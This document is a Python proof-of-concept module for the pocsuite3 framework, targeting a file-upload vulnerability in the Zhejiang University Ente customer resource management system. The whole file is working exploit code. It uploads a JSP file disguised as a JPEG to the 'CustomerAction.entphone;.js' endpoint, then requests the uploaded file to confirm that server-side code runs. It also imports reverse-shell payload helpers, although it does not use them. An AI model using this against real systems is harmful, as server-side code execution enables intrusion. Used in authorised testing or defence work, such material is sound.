# _*_ coding:utf-8 _*_
# @Time : 2023/12/15
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class zhedaente_upload(POCBase):
    pocDesc = '''浙大恩特客户资源管理系统CustomerAction.entphone;.js文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-15'
    name = '浙大恩特客户资源管理系统CustomerAction.entphone;.js文件上传漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/entsoft/CustomerAction.entphone;.js?method=loadFile'

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0 uacq",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A"
        }
        path = "/entsoft/CustomerAction.entphone;.js?method=loadFile"
        try:
            data = '------WebKitFormBoundarye8FPHsIAq9JN8j2A\r\nContent-Disposition: form-data; name="file";filename="test.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print("test");%>\r\n------WebKitFormBoundarye8FPHsIAq9JN8j2A--'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200:
                response_json = response.json()
                filepath = response_json.get('filepath')
                if filepath:
                    check_path = self.url + filepath
                    check_response = requests.get(check_path, headers=headers, verify=False)
                    if check_response.status_code == 200 and 'test' in check_response.text:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['path'] = path

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(zhedaente_upload)